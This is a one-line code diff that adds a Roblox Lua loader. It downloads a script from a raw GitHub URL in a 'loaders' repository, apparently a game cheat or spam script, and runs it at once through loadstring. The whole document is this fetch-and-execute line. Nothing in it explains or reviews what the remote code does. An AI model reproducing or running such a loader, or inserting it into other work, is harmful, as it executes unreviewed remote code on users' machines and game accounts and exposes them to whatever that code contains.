@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/7-days-cat-sitting-spam3-xnog6kb2l2on81.lua"))()
